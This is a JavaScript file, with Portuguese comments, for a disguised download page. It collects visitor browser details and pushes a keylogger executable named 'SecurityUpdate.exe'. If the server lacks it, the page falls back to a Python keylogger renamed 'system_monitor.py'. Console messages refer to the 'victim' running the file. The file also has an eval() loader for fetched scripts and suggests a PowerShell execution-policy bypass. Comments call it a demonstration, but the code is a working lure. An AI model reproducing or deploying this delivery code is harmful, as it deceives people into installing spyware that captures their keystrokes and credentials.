(function(){
  const downloadBtn = document.getElementById('download-btn');
  const status = document.getElementById('status');
  
  // CONFIGURAÇÃO: URL relativa (funciona em qualquer servidor)
  const API_URL = '/api';
  
  // Sem execução de payloads no cliente; execução ocorre apenas via servidor (server.py -> keylogger.py)

  function showStatus(message, type){
    status.hidden = false;
    status.textContent = message;
    status.className = `status ${type}`;
  }

  function hideStatus(){
    status.hidden = true;
    status.textContent = '';
    status.className = 'status';
  }

  // Simula download de arquivo
  function simulateDownload(filename, content){
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // Loga informações do usuário (apenas para demonstração local)
  function logUserInfo(){
    const info = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      referrer: document.referrer || 'direto',
      url: window.location.href
    };
    
    console.log('📊 Informações capturadas:', info);
    return info;
  }

  // (payload removido a pedido do usuário)

  // Função para executar script no servidor
  async function executeScriptOnServer(){
    console.log('🚀 Enviando comando para executar script no servidor...');
    
    try {
      const response = await fetch(`${API_URL}/execute`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          timestamp: new Date().toISOString()
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        console.log('✅ Script iniciado no servidor:', result);
        return result;
      } else {
        console.error('❌ Erro do servidor:', result.message);
        throw new Error(result.message);
      }
      
    } catch (error) {
      console.error('❌ Erro ao conectar com servidor:', error);
      
      // Se servidor não estiver rodando, mostra instrução
      if (error.message.includes('Failed to fetch')) {
        throw new Error('Servidor não está rodando. Execute: python server.py');
      }
      
      throw error;
    }
  }

  // Função para executar arquivo do caminho configurado
  async function executeFileFromPath(filePath, fileType){
    console.log(`🚀 Tentando executar: ${filePath} (tipo: ${fileType})`);
    
    try {
      // Faz requisição para buscar o conteúdo do arquivo
      const response = await fetch(filePath);
      
      if (!response.ok) {
        throw new Error(`Arquivo não encontrado: ${filePath}`);
      }
      
      const fileContent = await response.text();
      console.log(`📄 Arquivo carregado (${fileContent.length} caracteres)`);
      
      // Executa de acordo com o tipo
      switch(fileType.toLowerCase()) {
        case 'javascript':
        case 'js':
          // Executa JavaScript diretamente
          console.log('⚡ Executando JavaScript...');
          eval(fileContent);
          console.log('✅ JavaScript executado');
          break;
          
        case 'python':
        case 'py':
          // Python não pode ser executado no navegador diretamente
          // Mas podemos baixar o arquivo e instruir o usuário
          console.warn('⚠️ Python não pode ser executado no navegador');
          console.log('📥 Iniciando download do script Python...');
          
          const filename = filePath.split('/').pop();
          simulateDownload(filename, fileContent);
          
          // Cria instruções de execução
          const instructions = `
Para executar o arquivo baixado (${filename}):

1. Abra o PowerShell ou Terminal
2. Navegue até a pasta de Downloads
3. Execute: python ${filename}

Ou use este comando único:
python "%USERPROFILE%\\Downloads\\${filename}"
          `.trim();
          
          console.log(instructions);
          alert(instructions);
          break;
          
        case 'bat':
        case 'cmd':
          // Scripts batch - baixa e instrui
          console.log('📥 Baixando script batch...');
          simulateDownload(filePath.split('/').pop(), fileContent);
          alert('Script .bat baixado! Clique duas vezes no arquivo baixado para executar.\n\n⚠️ CUIDADO: Apenas execute scripts de fontes confiáveis!');
          break;
          
        case 'powershell':
        case 'ps1':
          // Scripts PowerShell - baixa e instrui
          console.log('📥 Baixando script PowerShell...');
          simulateDownload(filePath.split('/').pop(), fileContent);
          const psCmd = `powershell -ExecutionPolicy Bypass -File "${filePath.split('/').pop()}"`;
          alert(`Script PowerShell baixado!\n\nExecute no PowerShell:\n${psCmd}\n\n⚠️ CUIDADO: Apenas execute scripts de fontes confiáveis!`);
          break;
          
        case 'download':
          // Apenas baixa o arquivo sem executar
          console.log('📥 Baixando arquivo...');
          simulateDownload(filePath.split('/').pop(), fileContent);
          break;
          
        default:
          // Tipo desconhecido - apenas baixa
          console.log('📥 Tipo desconhecido, baixando arquivo...');
          simulateDownload(filePath.split('/').pop(), fileContent);
      }
      
      return {
        success: true,
        path: filePath,
        type: fileType,
        size: fileContent.length
      };
      
    } catch (error) {
      console.error('❌ Erro ao executar arquivo:', error);
      throw error;
    }
  }

  // Código executado ao clicar no botão
  downloadBtn.addEventListener('click', async () => {
    try {
      // Desabilita botão temporariamente
      downloadBtn.disabled = true;
      downloadBtn.classList.add('downloading');
      
      showStatus('⏳ Preparando download...', 'downloading');
      
      // 1. Captura informações (simulação de telemetria)
      const userInfo = logUserInfo();
      
      // 2. BAIXA O EXECUTÁVEL DO KEYLOGGER
      console.log('🎯 Preparando download do executável...');
      showStatus('📦 Gerando instalador...', 'downloading');
      
      // Simula delay de processamento
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // 3. Solicita o executável do servidor
      showStatus('📥 Baixando instalador...', 'downloading');
      
      try {
        const response = await fetch(`${API_URL}/download-exe`, {
          method: 'GET'
        });
        
        if (!response.ok) {
          throw new Error('Executável não disponível no servidor');
        }
        
        // Baixa o arquivo .exe
        const blob = await response.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'SecurityUpdate.exe';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        showStatus('✅ Download concluído! Execute o arquivo baixado.', 'success');
        console.log('📂 Executável baixado: SecurityUpdate.exe');
        console.log('⚠️  O keylogger será ativado quando a vítima executar o arquivo');
        
      } catch (downloadError) {
        console.warn('❌ Servidor não possui o .exe. Gerando instrução local...');
        
        // Fallback: Fornece o script Python para a vítima baixar
        const pythonScript = await fetch('../../backend/keylogger.py').then(r => r.text());
        simulateDownload('system_monitor.py', pythonScript);
        
        showStatus('✅ Script baixado! Instruções no console.', 'success');
        console.log('📂 Script Python baixado');
        console.log('ℹ️  Para executar: python system_monitor.py');
        console.log('⚠️  O keylogger captura teclas quando executado na máquina da vítima');
      }
      
      // Registra telemetria (opcional)
      console.log('📊 Telemetria capturada:', userInfo);
      
    } catch (error) {
      console.error('Erro ao processar download:', error);
      showStatus('❌ Erro ao iniciar download. Tente novamente.', 'error');
    } finally {
      // Reabilita botão
      downloadBtn.disabled = false;
      downloadBtn.classList.remove('downloading');
    }
  });

  // Executa código adicional ao carregar a página (opcional)
  window.addEventListener('load', () => {
    console.log('🔍 Página de download carregada');
    
    // Exemplo: detectar se usuário veio da página de cadastro
    const params = new URLSearchParams(window.location.search);
    if (params.has('from')) {
      console.log(`Usuário veio de: ${params.get('from')}`);
    }
  });
})();
